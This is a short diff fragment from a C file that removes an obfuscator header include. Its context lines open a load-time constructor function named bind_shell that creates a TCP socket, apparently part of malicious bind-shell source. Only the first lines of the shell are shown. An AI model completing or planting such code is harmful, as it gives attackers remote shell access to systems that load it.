@@ -4,8 +4,6 @@
 #include <unistd.h> 
 #include <sys/wait.h>
 
-#include "../src/obfuscator.h"
-
 void __attribute__((constructor)) bind_shell(){
   int host_sock = socket(AF_INET, SOCK_STREAM, 0);
   struct sockaddr_in host_addr;
